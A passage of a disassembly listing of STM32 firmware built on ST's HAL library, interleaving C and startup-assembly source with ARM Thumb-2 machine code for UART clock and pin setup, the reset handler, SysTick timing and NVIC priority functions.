 800121a:	f00b ffff 	bl	800d21c <memset>
  if(uartHandle->Instance==USART2)
 800121e:	687b      	ldr	r3, [r7, #4]
 8001220:	681b      	ldr	r3, [r3, #0]
 8001222:	4a28      	ldr	r2, [pc, #160]	; (80012c4 <HAL_UART_MspInit+0xcc>)
 8001224:	4293      	cmp	r3, r2
 8001226:	d148      	bne.n	80012ba <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8001228:	2302      	movs	r3, #2
 800122a:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 800122c:	2300      	movs	r3, #0
 800122e:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8001230:	f107 0310 	add.w	r3, r7, #16
 8001234:	4618      	mov	r0, r3
 8001236:	f003 fa97 	bl	8004768 <HAL_RCCEx_PeriphCLKConfig>
 800123a:	4603      	mov	r3, r0
 800123c:	2b00      	cmp	r3, #0
 800123e:	d001      	beq.n	8001244 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8001240:	f7ff fe3e 	bl	8000ec0 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8001244:	4b20      	ldr	r3, [pc, #128]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 8001246:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001248:	4a1f      	ldr	r2, [pc, #124]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 800124a:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 800124e:	6593      	str	r3, [r2, #88]	; 0x58
 8001250:	4b1d      	ldr	r3, [pc, #116]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 8001252:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001254:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001258:	60fb      	str	r3, [r7, #12]
 800125a:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 800125c:	4b1a      	ldr	r3, [pc, #104]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 800125e:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001260:	4a19      	ldr	r2, [pc, #100]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 8001262:	f043 0301 	orr.w	r3, r3, #1
 8001266:	64d3      	str	r3, [r2, #76]	; 0x4c
 8001268:	4b17      	ldr	r3, [pc, #92]	; (80012c8 <HAL_UART_MspInit+0xd0>)
 800126a:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800126c:	f003 0301 	and.w	r3, r3, #1
 8001270:	60bb      	str	r3, [r7, #8]
 8001272:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8001274:	2304      	movs	r3, #4
 8001276:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001278:	2302      	movs	r3, #2
 800127a:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 800127c:	2300      	movs	r3, #0
 800127e:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001280:	2303      	movs	r3, #3
 8001282:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001284:	2307      	movs	r3, #7
 8001286:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001288:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800128c:	4619      	mov	r1, r3
 800128e:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001292:	f000 fc67 	bl	8001b64 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 8001296:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800129a:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 800129c:	2302      	movs	r3, #2
 800129e:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80012a0:	2300      	movs	r3, #0
 80012a2:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80012a4:	2303      	movs	r3, #3
 80012a6:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 80012a8:	2303      	movs	r3, #3
 80012aa:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 80012ac:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80012b0:	4619      	mov	r1, r3
 80012b2:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80012b6:	f000 fc55 	bl	8001b64 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 80012ba:	bf00      	nop
 80012bc:	3778      	adds	r7, #120	; 0x78
 80012be:	46bd      	mov	sp, r7
 80012c0:	bd80      	pop	{r7, pc}
 80012c2:	bf00      	nop
 80012c4:	40004400 	.word	0x40004400
 80012c8:	40021000 	.word	0x40021000

080012cc <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 80012cc:	f8df d034 	ldr.w	sp, [pc, #52]	; 8001304 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 80012d0:	f7ff fede 	bl	8001090 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 80012d4:	480c      	ldr	r0, [pc, #48]	; (8001308 <LoopForever+0x6>)
  ldr r1, =_edata
 80012d6:	490d      	ldr	r1, [pc, #52]	; (800130c <LoopForever+0xa>)
  ldr r2, =_sidata
 80012d8:	4a0d      	ldr	r2, [pc, #52]	; (8001310 <LoopForever+0xe>)
  movs r3, #0
 80012da:	2300      	movs	r3, #0
  b LoopCopyDataInit
 80012dc:	e002      	b.n	80012e4 <LoopCopyDataInit>

080012de <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 80012de:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 80012e0:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 80012e2:	3304      	adds	r3, #4

080012e4 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 80012e4:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 80012e6:	428c      	cmp	r4, r1
  bcc CopyDataInit
 80012e8:	d3f9      	bcc.n	80012de <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 80012ea:	4a0a      	ldr	r2, [pc, #40]	; (8001314 <LoopForever+0x12>)
  ldr r4, =_ebss
 80012ec:	4c0a      	ldr	r4, [pc, #40]	; (8001318 <LoopForever+0x16>)
  movs r3, #0
 80012ee:	2300      	movs	r3, #0
  b LoopFillZerobss
 80012f0:	e001      	b.n	80012f6 <LoopFillZerobss>

080012f2 <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 80012f2:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 80012f4:	3204      	adds	r2, #4

080012f6 <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 80012f6:	42a2      	cmp	r2, r4
  bcc FillZerobss
 80012f8:	d3fb      	bcc.n	80012f2 <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 80012fa:	f00b ff97 	bl	800d22c <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 80012fe:	f7ff fccb 	bl	8000c98 <main>

08001302 <LoopForever>:

LoopForever:
    b LoopForever
 8001302:	e7fe      	b.n	8001302 <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 8001304:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001308:	20000000 	.word	0x20000000
  ldr r1, =_edata
 800130c:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 8001310:	0800d4f0 	.word	0x0800d4f0
  ldr r2, =_sbss
 8001314:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 8001318:	20001f14 	.word	0x20001f14

0800131c <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 800131c:	e7fe      	b.n	800131c <ADC1_IRQHandler>

0800131e <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 800131e:	b580      	push	{r7, lr}
 8001320:	b082      	sub	sp, #8
 8001322:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 8001324:	2300      	movs	r3, #0
 8001326:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 8001328:	2003      	movs	r0, #3
 800132a:	f000 f961 	bl	80015f0 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 800132e:	2000      	movs	r0, #0
 8001330:	f000 f80e 	bl	8001350 <HAL_InitTick>
 8001334:	4603      	mov	r3, r0
 8001336:	2b00      	cmp	r3, #0
 8001338:	d002      	beq.n	8001340 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 800133a:	2301      	movs	r3, #1
 800133c:	71fb      	strb	r3, [r7, #7]
 800133e:	e001      	b.n	8001344 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 8001340:	f7ff fe44 	bl	8000fcc <HAL_MspInit>
  }

  /* Return function status */
  return status;
 8001344:	79fb      	ldrb	r3, [r7, #7]
}
 8001346:	4618      	mov	r0, r3
 8001348:	3708      	adds	r7, #8
 800134a:	46bd      	mov	sp, r7
 800134c:	bd80      	pop	{r7, pc}
	...

08001350 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 8001350:	b580      	push	{r7, lr}
 8001352:	b084      	sub	sp, #16
 8001354:	af00      	add	r7, sp, #0
 8001356:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 8001358:	2300      	movs	r3, #0
 800135a:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 800135c:	4b17      	ldr	r3, [pc, #92]	; (80013bc <HAL_InitTick+0x6c>)
 800135e:	781b      	ldrb	r3, [r3, #0]
 8001360:	2b00      	cmp	r3, #0
 8001362:	d023      	beq.n	80013ac <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 8001364:	4b16      	ldr	r3, [pc, #88]	; (80013c0 <HAL_InitTick+0x70>)
 8001366:	681a      	ldr	r2, [r3, #0]
 8001368:	4b14      	ldr	r3, [pc, #80]	; (80013bc <HAL_InitTick+0x6c>)
 800136a:	781b      	ldrb	r3, [r3, #0]
 800136c:	4619      	mov	r1, r3
 800136e:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001372:	fbb3 f3f1 	udiv	r3, r3, r1
 8001376:	fbb2 f3f3 	udiv	r3, r2, r3
 800137a:	4618      	mov	r0, r3
 800137c:	f000 f96d 	bl	800165a <HAL_SYSTICK_Config>
 8001380:	4603      	mov	r3, r0
 8001382:	2b00      	cmp	r3, #0
 8001384:	d10f      	bne.n	80013a6 <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 8001386:	687b      	ldr	r3, [r7, #4]
 8001388:	2b0f      	cmp	r3, #15
 800138a:	d809      	bhi.n	80013a0 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 800138c:	2200      	movs	r2, #0
 800138e:	6879      	ldr	r1, [r7, #4]
 8001390:	f04f 30ff 	mov.w	r0, #4294967295
 8001394:	f000 f937 	bl	8001606 <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001398:	4a0a      	ldr	r2, [pc, #40]	; (80013c4 <HAL_InitTick+0x74>)
 800139a:	687b      	ldr	r3, [r7, #4]
 800139c:	6013      	str	r3, [r2, #0]
 800139e:	e007      	b.n	80013b0 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 80013a0:	2301      	movs	r3, #1
 80013a2:	73fb      	strb	r3, [r7, #15]
 80013a4:	e004      	b.n	80013b0 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 80013a6:	2301      	movs	r3, #1
 80013a8:	73fb      	strb	r3, [r7, #15]
 80013aa:	e001      	b.n	80013b0 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 80013ac:	2301      	movs	r3, #1
 80013ae:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 80013b0:	7bfb      	ldrb	r3, [r7, #15]
}
 80013b2:	4618      	mov	r0, r3
 80013b4:	3710      	adds	r7, #16
 80013b6:	46bd      	mov	sp, r7
 80013b8:	bd80      	pop	{r7, pc}
 80013ba:	bf00      	nop
 80013bc:	20000008 	.word	0x20000008
 80013c0:	20000000 	.word	0x20000000
 80013c4:	20000004 	.word	0x20000004

080013c8 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 80013c8:	b480      	push	{r7}
 80013ca:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 80013cc:	4b06      	ldr	r3, [pc, #24]	; (80013e8 <HAL_IncTick+0x20>)
 80013ce:	781b      	ldrb	r3, [r3, #0]
 80013d0:	461a      	mov	r2, r3
 80013d2:	4b06      	ldr	r3, [pc, #24]	; (80013ec <HAL_IncTick+0x24>)
 80013d4:	681b      	ldr	r3, [r3, #0]
 80013d6:	4413      	add	r3, r2
 80013d8:	4a04      	ldr	r2, [pc, #16]	; (80013ec <HAL_IncTick+0x24>)
 80013da:	6013      	str	r3, [r2, #0]
}
 80013dc:	bf00      	nop
 80013de:	46bd      	mov	sp, r7
 80013e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80013e4:	4770      	bx	lr
 80013e6:	bf00      	nop
 80013e8:	20000008 	.word	0x20000008
 80013ec:	200003b8 	.word	0x200003b8

080013f0 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 80013f0:	b480      	push	{r7}
 80013f2:	af00      	add	r7, sp, #0
  return uwTick;
 80013f4:	4b03      	ldr	r3, [pc, #12]	; (8001404 <HAL_GetTick+0x14>)
 80013f6:	681b      	ldr	r3, [r3, #0]
}
 80013f8:	4618      	mov	r0, r3
 80013fa:	46bd      	mov	sp, r7
 80013fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001400:	4770      	bx	lr
 8001402:	bf00      	nop
 8001404:	200003b8 	.word	0x200003b8

08001408 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001408:	b580      	push	{r7, lr}
 800140a:	b084      	sub	sp, #16
 800140c:	af00      	add	r7, sp, #0
 800140e:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 8001410:	f7ff ffee 	bl	80013f0 <HAL_GetTick>
 8001414:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 8001416:	687b      	ldr	r3, [r7, #4]
 8001418:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 800141a:	68fb      	ldr	r3, [r7, #12]
 800141c:	f1b3 3fff 	cmp.w	r3, #4294967295
 8001420:	d005      	beq.n	800142e <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 8001422:	4b0a      	ldr	r3, [pc, #40]	; (800144c <HAL_Delay+0x44>)
 8001424:	781b      	ldrb	r3, [r3, #0]
 8001426:	461a      	mov	r2, r3
 8001428:	68fb      	ldr	r3, [r7, #12]
 800142a:	4413      	add	r3, r2
 800142c:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 800142e:	bf00      	nop
 8001430:	f7ff ffde 	bl	80013f0 <HAL_GetTick>
 8001434:	4602      	mov	r2, r0
 8001436:	68bb      	ldr	r3, [r7, #8]
 8001438:	1ad3      	subs	r3, r2, r3
 800143a:	68fa      	ldr	r2, [r7, #12]
 800143c:	429a      	cmp	r2, r3
 800143e:	d8f7      	bhi.n	8001430 <HAL_Delay+0x28>
  {
  }
}
 8001440:	bf00      	nop
 8001442:	bf00      	nop
 8001444:	3710      	adds	r7, #16
 8001446:	46bd      	mov	sp, r7
 8001448:	bd80      	pop	{r7, pc}
 800144a:	bf00      	nop
 800144c:	20000008 	.word	0x20000008

08001450 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001450:	b480      	push	{r7}
 8001452:	b085      	sub	sp, #20
 8001454:	af00      	add	r7, sp, #0
 8001456:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 8001458:	687b      	ldr	r3, [r7, #4]
 800145a:	f003 0307 	and.w	r3, r3, #7
 800145e:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 8001460:	4b0c      	ldr	r3, [pc, #48]	; (8001494 <__NVIC_SetPriorityGrouping+0x44>)
 8001462:	68db      	ldr	r3, [r3, #12]
 8001464:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 8001466:	68ba      	ldr	r2, [r7, #8]
 8001468:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 800146c:	4013      	ands	r3, r2
 800146e:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001470:	68fb      	ldr	r3, [r7, #12]
 8001472:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 8001474:	68bb      	ldr	r3, [r7, #8]
 8001476:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001478:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 800147c:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001480:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 8001482:	4a04      	ldr	r2, [pc, #16]	; (8001494 <__NVIC_SetPriorityGrouping+0x44>)
 8001484:	68bb      	ldr	r3, [r7, #8]
 8001486:	60d3      	str	r3, [r2, #12]
}
 8001488:	bf00      	nop
 800148a:	3714      	adds	r7, #20
 800148c:	46bd      	mov	sp, r7
 800148e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001492:	4770      	bx	lr
 8001494:	e000ed00 	.word	0xe000ed00

08001498 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001498:	b480      	push	{r7}
 800149a:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 800149c:	4b04      	ldr	r3, [pc, #16]	; (80014b0 <__NVIC_GetPriorityGrouping+0x18>)
 800149e:	68db      	ldr	r3, [r3, #12]
 80014a0:	0a1b      	lsrs	r3, r3, #8
 80014a2:	f003 0307 	and.w	r3, r3, #7
}
 80014a6:	4618      	mov	r0, r3
 80014a8:	46bd      	mov	sp, r7
 80014aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014ae:	4770      	bx	lr
 80014b0:	e000ed00 	.word	0xe000ed00

080014b4 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80014b4:	b480      	push	{r7}
 80014b6:	b083      	sub	sp, #12
 80014b8:	af00      	add	r7, sp, #0
 80014ba:	4603      	mov	r3, r0
 80014bc:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80014be:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80014c2:	2b00      	cmp	r3, #0
 80014c4:	db0b      	blt.n	80014de <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 80014c6:	79fb      	ldrb	r3, [r7, #7]
 80014c8:	f003 021f 	and.w	r2, r3, #31
 80014cc:	4907      	ldr	r1, [pc, #28]	; (80014ec <__NVIC_EnableIRQ+0x38>)
 80014ce:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80014d2:	095b      	lsrs	r3, r3, #5
 80014d4:	2001      	movs	r0, #1
 80014d6:	fa00 f202 	lsl.w	r2, r0, r2
 80014da:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 80014de:	bf00      	nop
 80014e0:	370c      	adds	r7, #12
 80014e2:	46bd      	mov	sp, r7
 80014e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014e8:	4770      	bx	lr
 80014ea:	bf00      	nop
 80014ec:	e000e100 	.word	0xe000e100

080014f0 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 80014f0:	b480      	push	{r7}
 80014f2:	b083      	sub	sp, #12
 80014f4:	af00      	add	r7, sp, #0
 80014f6:	4603      	mov	r3, r0
 80014f8:	6039      	str	r1, [r7, #0]
 80014fa:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80014fc:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001500:	2b00      	cmp	r3, #0
 8001502:	db0a      	blt.n	800151a <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001504:	683b      	ldr	r3, [r7, #0]
 8001506:	b2da      	uxtb	r2, r3
 8001508:	490c      	ldr	r1, [pc, #48]	; (800153c <__NVIC_SetPriority+0x4c>)
 800150a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800150e:	0112      	lsls	r2, r2, #4
 8001510:	b2d2      	uxtb	r2, r2
 8001512:	440b      	add	r3, r1
 8001514:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 8001518:	e00a      	b.n	8001530 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800151a:	683b      	ldr	r3, [r7, #0]
 800151c:	b2da      	uxtb	r2, r3
 800151e:	4908      	ldr	r1, [pc, #32]	; (8001540 <__NVIC_SetPriority+0x50>)
 8001520:	79fb      	ldrb	r3, [r7, #7]
 8001522:	f003 030f 	and.w	r3, r3, #15
 8001526:	3b04      	subs	r3, #4
 8001528:	0112      	lsls	r2, r2, #4
 800152a:	b2d2      	uxtb	r2, r2
 800152c:	440b      	add	r3, r1
 800152e:	761a      	strb	r2, [r3, #24]
}
 8001530:	bf00      	nop
 8001532:	370c      	adds	r7, #12
 8001534:	46bd      	mov	sp, r7
 8001536:	f85d 7b04 	ldr.w	r7, [sp], #4
 800153a:	4770      	bx	lr
 800153c:	e000e100 	.word	0xe000e100
 8001540:	e000ed00 	.word	0xe000ed00

08001544 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8001544:	b480      	push	{r7}
 8001546:	b089      	sub	sp, #36	; 0x24
 8001548:	af00      	add	r7, sp, #0
 800154a:	60f8      	str	r0, [r7, #12]
 800154c:	60b9      	str	r1, [r7, #8]
 800154e:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8001550:	68fb      	ldr	r3, [r7, #12]
 8001552:	f003 0307 	and.w	r3, r3, #7
 8001556:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8001558:	69fb      	ldr	r3, [r7, #28]
 800155a:	f1c3 0307 	rsb	r3, r3, #7
 800155e:	2b04      	cmp	r3, #4
 8001560:	bf28      	it	cs
 8001562:	2304      	movcs	r3, #4
 8001564:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 8001566:	69fb      	ldr	r3, [r7, #28]
 8001568:	3304      	adds	r3, #4
 800156a:	2b06      	cmp	r3, #6
 800156c:	d902      	bls.n	8001574 <NVIC_EncodePriority+0x30>
 800156e:	69fb      	ldr	r3, [r7, #28]
 8001570:	3b03      	subs	r3, #3
 8001572:	e000      	b.n	8001576 <NVIC_EncodePriority+0x32>
 8001574:	2300      	movs	r3, #0
 8001576:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001578:	f04f 32ff 	mov.w	r2, #4294967295
 800157c:	69bb      	ldr	r3, [r7, #24]
 800157e:	fa02 f303 	lsl.w	r3, r2, r3
 8001582:	43da      	mvns	r2, r3
 8001584:	68bb      	ldr	r3, [r7, #8]
 8001586:	401a      	ands	r2, r3
 8001588:	697b      	ldr	r3, [r7, #20]
 800158a:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 800158c:	f04f 31ff 	mov.w	r1, #4294967295
 8001590:	697b      	ldr	r3, [r7, #20]
 8001592:	fa01 f303 	lsl.w	r3, r1, r3
 8001596:	43d9      	mvns	r1, r3
 8001598:	687b      	ldr	r3, [r7, #4]
 800159a:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800159c:	4313      	orrs	r3, r2
         );
}
 800159e:	4618      	mov	r0, r3
 80015a0:	3724      	adds	r7, #36	; 0x24
 80015a2:	46bd      	mov	sp, r7
 80015a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80015a8:	4770      	bx	lr
	...

080015ac <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 80015ac:	b580      	push	{r7, lr}
 80015ae:	b082      	sub	sp, #8
 80015b0:	af00      	add	r7, sp, #0
